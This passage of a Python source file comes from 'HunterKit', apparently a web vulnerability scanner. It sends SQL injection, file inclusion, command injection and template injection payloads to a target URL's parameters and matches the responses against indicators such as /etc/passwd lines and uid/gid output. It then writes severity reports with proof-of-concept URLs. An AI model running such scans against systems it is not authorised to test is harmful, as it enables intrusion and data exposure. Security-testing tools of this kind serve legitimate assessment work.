                                           data=test_params if method == 'POST' else None)
                response_time = time.time() - start_time
                
                self.update_stats('payloads_tested')
                
                if not response:
                    continue
                    
                # Check for SQL errors
                error_found = False
                matched_pattern = None
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        error_found = True
                        matched_pattern = pattern
                        break
                        
                # Check for time-based injection
                time_based = response_time > baseline_time + 4
                
                # Check for content-based changes
                content_change = abs(len(response.text) - len(baseline_content)) > 100
                
                if error_found or time_based:
                    detection_method = 'Error-based' if error_found else 'Time-based'
                    
                    vulnerability = {
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'url': url,
                        'method': method,
                        'parameter': param_name,
                        'payload': payload,
                        'detection_method': detection_method,
                        'error_pattern': matched_pattern if error_found else None,
                        'response_time': response_time,
                        'baseline_time': baseline_time,
                        'poc_url': self.generate_poc_url(url, method, param_name, payload),
                        'timestamp': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vulnerability)
                    self.update_stats('vulnerabilities_found')
                    
                    self.vuln_log(f"SQL injection vulnerability detected!")
                    print(f"  {Colors.BOLD}Type:{Colors.END} SQL Injection ({detection_method})")
                    print(f"  {Colors.BOLD}Severity:{Colors.END} {Colors.RED}High{Colors.END}")
                    print(f"  {Colors.BOLD}Parameter:{Colors.END} {param_name}")
                    print(f"  {Colors.BOLD}Payload:{Colors.END} {Colors.RED}{payload}{Colors.END}")
                    if error_found:
                        print(f"  {Colors.BOLD}Error Pattern:{Colors.END} {matched_pattern}")
                    if time_based:
                        print(f"  {Colors.BOLD}Response Time:{Colors.END} {response_time:.2f}s (baseline: {baseline_time:.2f}s)")
                    break
                    
            print(f"{Colors.BLUE}[COMPLETED]{Colors.END} SQL injection testing for parameter '{param_name}'\n")
                    
        return vulnerabilities
        
    def test_lfi(self, url: str, params: dict, method: str = 'GET') -> List[Dict]:
        """Advanced Local File Inclusion testing"""
        vulnerabilities = []
        lfi_payloads = self.payload_manager.load_payloads('lfi')
        
        if not lfi_payloads:
            return vulnerabilities
            
        self.success_log(f"Loaded {len(lfi_payloads)} LFI payloads")
        
        # Enhanced LFI indicators
        lfi_indicators = [
            r'root:x:0:0:', r'daemon:x:', r'www-data:x:', r'mysql:x:', r'nobody:x:',
            r'# /etc/passwd', r'# This file describes', r'# network interfaces',
            r'\[boot loader\]', r'\[operating systems\]', r'Windows Registry Editor',
            r'\[fonts\]', r'for 16-bit app support', r'\[extensions\]',
            r'# Hosts file', r'localhost', r'127\.0\.0\.1.*localhost'
        ]
        
        for param_name in params.keys():
            self.info_log(f"Testing LFI in parameter: {Colors.YELLOW}{param_name}{Colors.END}")
            
            for i, payload in enumerate(lfi_payloads, 1):
                print(f"{Colors.CYAN}[{i:2d}/{len(lfi_payloads)}]{Colors.END} Testing: {Colors.YELLOW}{payload}{Colors.END}")
                
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self.make_request(url, method=method,
                                           params=test_params if method == 'GET' else None,
                                           data=test_params if method == 'POST' else None)
                
                self.update_stats('payloads_tested')
                
                if not response:
                    continue
                    
                for indicator in lfi_indicators:
                    if re.search(indicator, response.text, re.IGNORECASE):
                        vulnerability = {
                            'type': 'Local File Inclusion',
                            'severity': 'High',
                            'url': url,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'indicator': indicator,
                            'poc_url': self.generate_poc_url(url, method, param_name, payload),
                            'timestamp': datetime.now().isoformat()
                        }
                        vulnerabilities.append(vulnerability)
                        self.update_stats('vulnerabilities_found')
                        
                        self.vuln_log(f"LFI vulnerability detected!")
                        print(f"  {Colors.BOLD}Type:{Colors.END} Local File Inclusion")
                        print(f"  {Colors.BOLD}Severity:{Colors.END} {Colors.RED}High{Colors.END}")
                        print(f"  {Colors.BOLD}Parameter:{Colors.END} {param_name}")
                        print(f"  {Colors.BOLD}Payload:{Colors.END} {Colors.RED}{payload}{Colors.END}")
                        print(f"  {Colors.BOLD}Indicator:{Colors.END} {indicator}")
                        break
                        
            print(f"{Colors.BLUE}[COMPLETED]{Colors.END} LFI testing for parameter '{param_name}'\n")
                        
        return vulnerabilities
        
    def test_command_injection(self, url: str, params: dict, method: str = 'GET') -> List[Dict]:
        """Advanced Command injection testing"""
        vulnerabilities = []
        command_payloads = self.payload_manager.load_payloads('command')
        
        if not command_payloads:
            return vulnerabilities
            
        self.success_log(f"Loaded {len(command_payloads)} command injection payloads")
        
        # Enhanced command execution indicators
        command_indicators = [
            r'uid=\d+.*gid=\d+', r'root:x:0:0:', r'www-data', r'apache',
            r'Microsoft Windows \[Version', r'Volume Serial Number',
            r'Directory of C:\\', r'total \d+', r'\d+ file\(s\)',
            r'Linux.*\d+\.\d+\.\d+', r'Darwin.*\d+\.\d+\.\d+',
            r'GNU/Linux', r'PING.*bytes of data', r'64 bytes from'
        ]
        
        for param_name in params.keys():
            self.info_log(f"Testing command injection in parameter: {Colors.YELLOW}{param_name}{Colors.END}")
            
            for i, payload in enumerate(command_payloads, 1):
                print(f"{Colors.CYAN}[{i:2d}/{len(command_payloads)}]{Colors.END} Testing: {Colors.YELLOW}{payload}{Colors.END}")
                
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self.make_request(url, method=method,
                                           params=test_params if method == 'GET' else None,
                                           data=test_params if method == 'POST' else None)
                
                self.update_stats('payloads_tested')
                
                if not response:
                    continue
                    
                for indicator in command_indicators:
                    if re.search(indicator, response.text, re.IGNORECASE):
                        vulnerability = {
                            'type': 'Command Injection',
                            'severity': 'Critical',
                            'url': url,
                            'method': method,
                            'parameter': param_name,
                            'payload': payload,
                            'indicator': indicator,
                            'poc_url': self.generate_poc_url(url, method, param_name, payload),
                            'timestamp': datetime.now().isoformat()
                        }
                        vulnerabilities.append(vulnerability)
                        self.update_stats('vulnerabilities_found')
                        
                        self.vuln_log(f"Command injection vulnerability detected!")
                        print(f"  {Colors.BOLD}Type:{Colors.END} Command Injection")
                        print(f"  {Colors.BOLD}Severity:{Colors.END} {Colors.RED}Critical{Colors.END}")
                        print(f"  {Colors.BOLD}Parameter:{Colors.END} {param_name}")
                        print(f"  {Colors.BOLD}Payload:{Colors.END} {Colors.RED}{payload}{Colors.END}")
                        print(f"  {Colors.BOLD}Indicator:{Colors.END} {indicator}")
                        break
                        
            print(f"{Colors.BLUE}[COMPLETED]{Colors.END} Command injection testing for parameter '{param_name}'\n")
                        
        return vulnerabilities
        
    def test_ssti(self, url: str, params: dict, method: str = 'GET') -> List[Dict]:
        """Advanced Server-Side Template Injection testing"""
        vulnerabilities = []
        ssti_payloads = self.payload_manager.load_payloads('ssti')
        
        if not ssti_payloads:
            return vulnerabilities
            
        self.success_log(f"Loaded {len(ssti_payloads)} SSTI payloads")
        
        for param_name in params.keys():
            self.info_log(f"Testing SSTI in parameter: {Colors.YELLOW}{param_name}{Colors.END}")
            
            for i, payload in enumerate(ssti_payloads, 1):
                print(f"{Colors.CYAN}[{i:2d}/{len(ssti_payloads)}]{Colors.END} Testing: {Colors.YELLOW}{payload}{Colors.END}")
                
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = self.make_request(url, method=method,
                                           params=test_params if method == 'GET' else None,
                                           data=test_params if method == 'POST' else None)
                
                self.update_stats('payloads_tested')
                
                if not response:
                    continue
                    
                # Check for template expression evaluation
                if ('49' in response.text and '7*7' in payload) or \
                   ('49' in response.text and "7*'7'" in payload) or \
                   ('config' in response.text.lower() and 'config' in payload.lower()):
                    
                    vulnerability = {
                        'type': 'Server-Side Template Injection',
                        'severity': 'High',
                        'url': url,
                        'method': method,
                        'parameter': param_name,
                        'payload': payload,
                        'poc_url': self.generate_poc_url(url, method, param_name, payload),
                        'timestamp': datetime.now().isoformat()
                    }
                    vulnerabilities.append(vulnerability)
                    self.update_stats('vulnerabilities_found')
                    
                    self.vuln_log(f"SSTI vulnerability detected!")
                    print(f"  {Colors.BOLD}Type:{Colors.END} Server-Side Template Injection")
                    print(f"  {Colors.BOLD}Severity:{Colors.END} {Colors.RED}High{Colors.END}")
                    print(f"  {Colors.BOLD}Parameter:{Colors.END} {param_name}")
                    print(f"  {Colors.BOLD}Payload:{Colors.END} {Colors.RED}{payload}{Colors.END}")
                    break
                    
            print(f"{Colors.BLUE}[COMPLETED]{Colors.END} SSTI testing for parameter '{param_name}'\n")
                    
        return vulnerabilities
        
    def generate_poc_url(self, url: str, method: str, param: str, payload: str) -> str:
        """Generate accurate PoC URL"""
        parsed = urlparse(url)
        
        if method == 'GET':
            # Parse existing parameters
            existing_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            # Replace vulnerable parameter with payload
            existing_params[param] = [payload]
            # Rebuild URL
            new_query = urllib.parse.urlencode(existing_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        else:
            # POST method
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                base_url += f"?{parsed.query}"
            return f"{base_url} [POST: {param}={urllib.parse.quote(payload)}]"
            
    def scan_target(self) -> List[Dict]:
        """Main comprehensive scanning function"""
        self.stats['scan_start_time'] = datetime.now()
        self.print_banner()
        
        self.info_log(f"Target: {Colors.BOLD}{self.target_url}{Colors.END}")
        self.info_log(f"Configuration: Threads={self.threads}, Delay={self.delay}s, Debug={self.debug}")
        
        # Validate target
        if not self.validate_target():
            self.error_log("Target validation failed - aborting scan")
            return []
        
        # Detect technologies
        print(f"\n{Colors.YELLOW}[SCAN]{Colors.END} Analyzing target technologies and security measures...")
        initial_response = self.make_request(self.target_url)
        
        if not initial_response:
            self.error_log("Could not establish connection to target")
            return []
            
        self.success_log("Connection established successfully!")
        
        technologies = self.detect_technologies(initial_response)
        
        # Display technology information
        if technologies['servers']:
            self.info_log(f"Server: {', '.join(technologies['servers'])}")
        if technologies['waf']:
            self.warning_log(f"WAF Detected: {Colors.RED}{', '.join(technologies['waf'])}{Colors.END}")
        if technologies['frameworks']:
            self.info_log(f"Frameworks: {', '.join(technologies['frameworks'])}")
        if technologies['cms']:
            self.info_log(f"CMS: {', '.join(technologies['cms'])}")
        if technologies['security_headers']:
            self.info_log(f"Security Headers: {len(technologies['security_headers'])} detected")
            
        # Extract parameters
        print(f"\n{Colors.YELLOW}[SCAN]{Colors.END} Extracting parameters from target...")
        parameters = self.extract_parameters(self.target_url)
        
        total_params = len(parameters['get']) + len(parameters['post'])
        if total_params == 0:
            self.warning_log("No testable parameters found")
            return []
            
        self.info_log(f"Found {len(parameters['get'])} GET parameters: {list(parameters['get'].keys())}")
        self.info_log(f"Found {len(parameters['post'])} POST parameters: {list(parameters['post'].keys())}")
        
        # Start comprehensive vulnerability testing
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'═' * 70}")
        print(f"🎯 STARTING ADVANCED VULNERABILITY ASSESSMENT")
        print(f"{'═' * 70}{Colors.END}")
        
        # Test GET parameters
        if parameters['get']:
            print(f"\n{Colors.YELLOW}[TESTING]{Colors.END} Comprehensive analysis of GET parameters...")
            
            # XSS Testing
            print(f"\n{Colors.CYAN}🔍 CROSS-SITE SCRIPTING (XSS) TESTING{Colors.END}")
            print("─" * 60)
            xss_vulns = self.test_xss(self.target_url, parameters['get'], 'GET')
            self.vulnerabilities.extend(xss_vulns)
            
            # SQL Injection Testing
            print(f"\n{Colors.CYAN}💉 SQL INJECTION TESTING{Colors.END}")
            print("─" * 60)
            sql_vulns = self.test_sql_injection(self.target_url, parameters['get'], 'GET')
            self.vulnerabilities.extend(sql_vulns)
            
            # LFI Testing
            print(f"\n{Colors.CYAN}📁 LOCAL FILE INCLUSION TESTING{Colors.END}")
            print("─" * 60)
            lfi_vulns = self.test_lfi(self.target_url, parameters['get'], 'GET')
            self.vulnerabilities.extend(lfi_vulns)
            
            # Command Injection Testing
            print(f"\n{Colors.CYAN}🔓 COMMAND INJECTION TESTING{Colors.END}")
            print("─" * 60)
            cmd_vulns = self.test_command_injection(self.target_url, parameters['get'], 'GET')
            self.vulnerabilities.extend(cmd_vulns)
            
            # SSTI Testing
            print(f"\n{Colors.CYAN}⚡ SERVER-SIDE TEMPLATE INJECTION TESTING{Colors.END}")
            print("─" * 60)
            ssti_vulns = self.test_ssti(self.target_url, parameters['get'], 'GET')
            self.vulnerabilities.extend(ssti_vulns)
            
        # Test POST parameters
        if parameters['post']:
            print(f"\n{Colors.YELLOW}[TESTING]{Colors.END} Comprehensive analysis of POST parameters...")
            
            xss_vulns = self.test_xss(self.target_url, parameters['post'], 'POST')
            self.vulnerabilities.extend(xss_vulns)
            
            sql_vulns = self.test_sql_injection(self.target_url, parameters['post'], 'POST')
            self.vulnerabilities.extend(sql_vulns)
            
            lfi_vulns = self.test_lfi(self.target_url, parameters['post'], 'POST')
            self.vulnerabilities.extend(lfi_vulns)
            
            cmd_vulns = self.test_command_injection(self.target_url, parameters['post'], 'POST')
            self.vulnerabilities.extend(cmd_vulns)
            
            ssti_vulns = self.test_ssti(self.target_url, parameters['post'], 'POST')
            self.vulnerabilities.extend(ssti_vulns)
            
        self.stats['scan_end_time'] = datetime.now()
        return self.vulnerabilities
        
    def generate_report(self) -> str:
        """Generate comprehensive professional report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Calculate scan duration
        if self.stats['scan_start_time'] and self.stats['scan_end_time']:
            duration = self.stats['scan_end_time'] - self.stats['scan_start_time']
            duration_str = str(duration).split('.')[0]  # Remove microseconds
        else:
            duration_str = "Unknown"
        
        # Calculate success rate
        total_requests = self.stats['requests_total']
        success_rate = (self.stats['requests_successful'] / max(total_requests, 1)) * 100
        
        if not self.vulnerabilities:
            report = f"""
{Colors.GREEN}{'═'*80}
🛡️  HUNTERKIT ADVANCED SECURITY SCAN REPORT - NO VULNERABILITIES DETECTED
{'═'*80}{Colors.END}

🎯 Target: {self.target_url}
🕒 Scan Time: {timestamp}
⏱️  Scan Duration: {duration_str}
📊 Total Vulnerabilities: 0

📈 Advanced Scan Statistics:
   Total HTTP Requests: {self.stats['requests_total']}
   Successful Requests: {self.stats['requests_successful']}
   Failed Requests: {self.stats['requests_failed']}
   Payloads Tested: {self.stats['payloads_tested']}
   Success Rate: {success_rate:.1f}%
   Average Response Time: {(self.stats['requests_total'] * self.delay):.1f}s

{Colors.GREEN}[✓ EXCELLENT] No vulnerabilities detected during this comprehensive security assessment.{Colors.END}

{Colors.YELLOW}📝 Important Note:{Colors.END} While no vulnerabilities were found by automated testing,
manual security testing and code review are recommended for complete security assurance.

{Colors.CYAN}{'─' * 80}
🚀 Professional scan completed with HunterKit v1.0.0
👨‍💻 Security Researcher: Kawindu Wijewardhane (@kawinduwijewardhane)
🌐 GitHub Repository: https://github.com/kawinduwijewardhane/HunterKit
📧 Contact: https://www.kawindu.co.uk
{'─' * 80}{Colors.END}
"""
            return report
            
        # Categorize vulnerabilities by severity
        critical = [v for v in self.vulnerabilities if v['severity'] == 'Critical']
        high = [v for v in self.vulnerabilities if v['severity'] == 'High']
        medium = [v for v in self.vulnerabilities if v['severity'] == 'Medium']
        low = [v for v in self.vulnerabilities if v['severity'] == 'Low']
        
        report = f"""
{Colors.RED}{'═'*80}
🚨 HUNTERKIT ADVANCED SECURITY SCAN REPORT - CRITICAL ISSUES FOUND
{'═'*80}{Colors.END}

🎯 Target: {Colors.BOLD}{self.target_url}{Colors.END}
🕒 Scan Time: {timestamp}
⏱️  Scan Duration: {duration_str}
📊 Total Vulnerabilities: {Colors.BOLD}{len(self.vulnerabilities)}{Colors.END}

📈 Advanced Scan Statistics:
   Total HTTP Requests: {self.stats['requests_total']}
   Successful Requests: {self.stats['requests_successful']}
   Failed Requests: {self.stats['requests_failed']}
   Payloads Tested: {self.stats['payloads_tested']}
   Success Rate: {success_rate:.1f}%

🔥 SEVERITY BREAKDOWN:
{Colors.RED}🔥 Critical: {len(critical)}{Colors.END} | {Colors.YELLOW}⚠️  High: {len(high)}{Colors.END} | {Colors.BLUE}📊 Medium: {len(medium)}{Colors.END} | {Colors.GREEN}ℹ️  Low: {len(low)}{Colors.END}
"""
        
        # Display vulnerabilities by severity
        severity_groups = [
            ('Critical', critical, Colors.RED, '🔥'),
            ('High', high, Colors.YELLOW, '⚠️'),
            ('Medium', medium, Colors.BLUE, '📊'),
            ('Low', low, Colors.GREEN, 'ℹ️')
        ]
        
        for severity, vulns, color, icon in severity_groups:
            if not vulns:
                continue
                
            report += f"\n{color}{'═'*80}\n"
            report += f"{icon} {severity.upper()} SEVERITY VULNERABILITIES ({len(vulns)})\n"
            report += f"{'═'*80}{Colors.END}\n"
            
            for i, vuln in enumerate(vulns, 1):
                report += f"\n{color}[{i}] {vuln['type']}{Colors.END}\n"
                report += f"{'-'*70}\n"
                report += f"🌐 URL: {vuln['url']}\n"
                report += f"📡 Method: {vuln['method']}\n"
                report += f"🎯 Parameter: {Colors.BOLD}{vuln['parameter']}{Colors.END}\n"
                report += f"💉 Payload: {Colors.RED}{vuln['payload']}{Colors.END}\n"
                
                if 'detection_method' in vuln:
                    report += f"🔍 Detection Method: {vuln['detection_method']}\n"
                if 'context' in vuln:
                    report += f"📋 Context: {vuln['context']}\n"
                if 'reason' in vuln:
                    report += f"📝 Analysis: {vuln['reason']}\n"
                if 'indicator' in vuln:
                    report += f"🔗 Indicator: {vuln['indicator']}\n"
                if 'error_pattern' in vuln and vuln['error_pattern']:
                    report += f"❌ Error Pattern: {vuln['error_pattern']}\n"
                    
                report += f"🔗 Proof of Concept: {Colors.UNDERLINE}{vuln['poc_url']}{Colors.END}\n"
                report += f"⏰ Discovered: {vuln['timestamp']}\n"
                
        report += f"""

{Colors.CYAN}{'═'*80}
🛠️  PROFESSIONAL SECURITY RECOMMENDATIONS
{'═'*80}{Colors.END}

{Colors.RED}🔥 IMMEDIATE ACTIONS REQUIRED:{Colors.END}
🔸 Input Validation: Implement comprehensive input validation and sanitization
🔸 Output Encoding: Apply proper output encoding for all user data
🔸 Parameterized Queries: Use prepared statements for all database interactions
🔸 Access Controls: Implement proper authentication and authorization
🔸 Security Headers: Deploy comprehensive security headers (CSP, HSTS, etc.)

{Colors.YELLOW}⚠️  MEDIUM-TERM IMPROVEMENTS:{Colors.END}
🔸 WAF Deployment: Implement Web Application Firewall with custom rules
🔸 Rate Limiting: Deploy request rate limiting and anomaly detection
🔸 Security Testing: Establish regular automated and manual security testing
🔸 Code Review: Implement secure code review processes
🔸 Monitoring: Deploy real-time security monitoring and alerting

{Colors.GREEN}✅ LONG-TERM SECURITY STRATEGY:{Colors.END}
🔸 Security Training: Provide regular security awareness training for developers
🔸 SDLC Integration: Integrate security testing into development lifecycle
🔸 Incident Response: Establish comprehensive incident response procedures
🔸 Compliance: Ensure compliance with relevant security standards
🔸 Third-party Security: Regular security assessment of third-party components

{Colors.CYAN}{'═'*80}
📋 PROFESSIONAL SECURITY ASSESSMENT COMPLETED
{'═'*80}{Colors.END}

👨‍💻 Security Researcher: Kawindu Wijewardhane (@kawinduwijewardhane)
🌐 GitHub Repository: https://github.com/kawinduwijewardhane/HunterKit
📧 Professional Contact: https://www.kawindu.co.uk
🔗 LinkedIn: https://linkedin.com/in/kawinduwijewardhane
🐦 Twitter: @k_wijewardhane

📁 Payload Configuration: ./payloads/ directory
🎨 Custom Payloads: Add custom payloads to respective .txt files
📖 Documentation: Complete usage guide available on GitHub

{Colors.YELLOW}⚠️  LEGAL DISCLAIMER & RESPONSIBLE DISCLOSURE{Colors.END}
This security assessment tool is designed exclusively for authorized testing.
• Only use on applications you own or have explicit written permission to test
• Unauthorized testing may violate laws and terms of service
• Report vulnerabilities responsibly through proper disclosure channels
• The developer assumes no liability for misuse of this tool
• Users are responsible for compliance with applicable laws and regulations

{Colors.GREEN}🏆 HunterKit v1.0.0 - Professional Web Vulnerability Scanner{Colors.END}
{Colors.CYAN}Built with ❤️ by the security community, for the security community{Colors.END}
"""
        
        return report
        
    def save_report(self, format: str = 'txt') -> str:
        """Save comprehensive report with metadata"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if format.lower() == 'json':
            filename = f"hunterkit_advanced_report_{timestamp}.json"
            
            # Calculate scan duration
            if self.stats['scan_start_time'] and self.stats['scan_end_time']:
                duration = (self.stats['scan_end_time'] - self.stats['scan_start_time']).total_seconds()
            else:
                duration = 0
                
            report_data = {
                'tool_info': {
                    'name': 'HunterKit',
                    'version': '1.0.0',
                    'description': 'Professional Web Vulnerability Scanner',
                    'developer': 'Kawindu Wijewardhane (@kawinduwijewardhane)',
                    'github': 'https://github.com/kawinduwijewardhane/HunterKit',
                    'contact': 'https://www.kawindu.co.uk'
                },
                'scan_info': {
                    'target': self.target_url,
                    'scan_time': datetime.now().isoformat(),
                    'scan_duration_seconds': duration,
                    'configuration': {
                        'threads': self.threads,
                        'delay': self.delay,
                        'debug_mode': self.debug
                    }
                },
                'statistics': self.stats,
                'results': {
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'vulnerabilities_by_severity': {
                        'critical': len([v for v in self.vulnerabilities if v['severity'] == 'Critical']),
                        'high': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
                        'medium': len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
                        'low': len([v for v in self.vulnerabilities if v['severity'] == 'Low'])
                    },
                    'vulnerabilities': self.vulnerabilities
                }
            }
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, indent=2, ensure_ascii=False, default=str)
                
        else:
            filename = f"hunterkit_advanced_report_{timestamp}.txt"
            # Generate clean report without colors for file
            clean_report = re.sub(r'\033\[[0-9;]*m', '', self.generate_report())
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(clean_report)
                
        return filename

def main():
    parser = argparse.ArgumentParser(
        description='HunterKit v1.0.0 - Professional Web Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Colors.CYAN}Professional Examples:{Colors.END}
  python hunterkit.py -u http://testphp.vulnweb.com/search.php?test=query
  python hunterkit.py -u https://target.com/search?q=test -d 0.5 -t 20
  python hunterkit.py -u https://api.target.com/endpoint --format json --debug
  
{Colors.GREEN}Professional Features:{Colors.END}
  • Advanced XSS detection with context analysis
  • Comprehensive SQL injection testing (Error, Time, Boolean-based)
  • Local File Inclusion with extensive payload library
  • Command injection detection with OS fingerprinting
  • Server-Side Template Injection for multiple engines
  • WAF detection and evasion techniques
  • Professional reporting in TXT and JSON formats
  
{Colors.YELLOW}Developer Information:{Colors.END}
  🌐 GitHub: https://github.com/kawinduwijewardhane/HunterKit
  👨‍💻 Developer: Kawindu Wijewardhane (@kawinduwijewardhane)
  📧 Contact: https://www.kawindu.co.uk
        """
    )
    
    parser.add_argument('-u', '--url', required=True, 
                       help='Target URL to scan (must include parameters for testing)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of concurrent threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=1.0,
                       help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('--format', choices=['txt', 'json'], default='txt',
                       help='Report output format (default: txt)')
    parser.add_argument('--debug', action='store_true',
                       help='Enable detailed debug output for troubleshooting')
    parser.add_argument('--no-banner', action='store_true',
                       help='Suppress banner and authorization prompts (for automation)')
    parser.add_argument('-v', '--version', action='version', 
                       version='HunterKit v1.0.0 - Professional Web Vulnerability Scanner')
    
    args = parser.parse_args()
    
    # URL validation
    try:
        parsed = urlparse(args.url)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError("URL must include scheme (http:// or https://) and hostname")
        if not parsed.query and 'search' not in parsed.path.lower():
            print(f"{Colors.YELLOW}[TIP]{Colors.END} For best results, include parameters in the URL (e.g., ?param=value)")
    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.END} Invalid URL format: {e}")
        print(f"{Colors.CYAN}[EXAMPLE]{Colors.END} python hunterkit.py -u 'https://example.com/search?q=test'")
        sys.exit(1)
        
    # Authorization and legal compliance
    if not args.no_banner:
        print(f"\n{Colors.RED}{'='*80}")
        print(f"{Colors.BOLD}⚠️  LEGAL AUTHORIZATION REQUIRED - ETHICAL HACKING ONLY{Colors.END}")
        print(f"{Colors.RED}{'='*80}{Colors.END}")
        print(f"{Colors.YELLOW}This professional security tool should ONLY be used on:{Colors.END}")
        print(f"  • Applications you own and operate")
        print(f"  • Systems with explicit written permission from the owner")
        print(f"  • Authorized penetration testing engagements")
        print(f"  • Bug bounty programs with proper scope authorization")
        print(f"\n{Colors.RED}Unauthorized testing may violate:{Colors.END}")
        print(f"  • Computer Fraud and Abuse Act (CFAA)")
        print(f"  • Digital Millennium Copyright Act (DMCA)")
        print(f"  • Terms of Service agreements")
        print(f"  • Local and international cybersecurity laws")
        print(f"{Colors.RED}{'-'*80}{Colors.END}")
        
        response = input(f"{Colors.CYAN}Do you have proper legal authorization to test {args.url}? (y/N): {Colors.END}")
        if response.lower() not in ['y', 'yes']:
            print(f"{Colors.RED}[ABORTED]{Colors.END} Scan cancelled - Legal authorization required")
            print(f"{Colors.GREEN}[INFO]{Colors.END} Thank you for using HunterKit responsibly!")
            sys.exit(1)
            
    # Initialize professional scanner
    scanner = HunterKit(args.url, threads=args.threads, delay=args.delay, debug=args.debug)
    
    try:
        # Execute comprehensive security scan
        vulnerabilities = scanner.scan_target()
        
        # Display scan completion
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'═' * 80}")
        print(f"🏁 ADVANCED SECURITY SCAN COMPLETED SUCCESSFULLY")
        print(f"{'═' * 80}{Colors.END}")
        
        # Display final statistics
        print(f"\n{Colors.CYAN}📊 Final Scan Statistics:{Colors.END}")
        print(f"   HTTP Requests Made: {scanner.stats['requests_total']}")
        print(f"   Security Payloads Tested: {scanner.stats['payloads_tested']}")
        print(f"   Vulnerabilities Discovered: {Colors.BOLD}{scanner.stats['vulnerabilities_found']}{Colors.END}")
        
        if scanner.stats['vulnerabilities_found'] > 0:
            critical = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
            high = len([v for v in vulnerabilities if v['severity'] == 'High'])
            print(f"   Risk Level: {Colors.RED}{'CRITICAL' if critical > 0 else 'HIGH' if high > 0 else 'MEDIUM'}{Colors.END}")
        
        # Generate and display professional report
        report = scanner.generate_report()
        print(report)
        
        # Save comprehensive report
        filename = scanner.save_report(args.format)
        print(f"\n{Colors.GREEN}[SUCCESS]{Colors.END} Professional security report saved: {Colors.BOLD}{filename}{Colors.END}")
        
        # Final message
        print(f"\n{Colors.GREEN}🎉 Thank you for using HunterKit v1.0.0!{Colors.END}")
        print(f"{Colors.CYAN}🔗 Star us on GitHub: https://github.com/kawinduwijewardhane/HunterKit{Colors.END}")
        
        # Professional exit codes for automation
        if vulnerabilities:
            critical = len([v for v in vulnerabilities if v['severity'] == 'Critical'])
            high = len([v for v in vulnerabilities if v['severity'] == 'High'])
            
            if critical > 0:
                sys.exit(3)  # Critical vulnerabilities found
            elif high > 0:
                sys.exit(2)  # High severity vulnerabilities found
            else:
                sys.exit(1)  # Medium/Low severity vulnerabilities found
        else:
            sys.exit(0)  # No vulnerabilities found
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INTERRUPTED]{Colors.END} Security scan cancelled by user")
        print(f"{Colors.CYAN}Thank you for using HunterKit responsibly! 🚀{Colors.END}")
        sys.exit(130)
    except Exception as e:
        print(f"{Colors.RED}[CRITICAL ERROR]{Colors.END} Scan failed unexpectedly: {e}")
        if args.debug:
            import traceback
            print(f"\n{Colors.PURPLE}[DEBUG TRACE]{Colors.END}")
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
